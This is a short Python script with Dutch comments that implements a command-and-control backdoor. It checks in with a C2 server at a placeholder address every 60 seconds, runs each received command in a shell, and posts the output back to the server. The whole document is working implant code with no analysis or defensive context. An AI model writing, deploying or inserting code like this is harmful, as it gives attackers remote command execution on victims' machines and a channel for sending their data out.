import requests
import time
import subprocess

# Configuratie
c2_url = "http://your_c2_server_ip:port/"
check_in_interval = 60  # Controleer elke 60 seconden op nieuwe commando's

while True:
    try:
        # Haal nieuwe commando's op van de C2 server
        response = requests.get(f"{c2_url}get_command")
        command = response.text.strip()

        if command:
            # Voer het commando uit en leg de output vast
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
            
            # Stuur de output terug naar de C2 server
            requests.post(f"{c2_url}post_output", data=output)
    except Exception as e:
        # Bij een fout, log deze en ga verder
        print(f"Fout: {str(e)}")

    # Wacht het opgegeven interval voor de volgende check-in
    time.sleep(check_in_interval)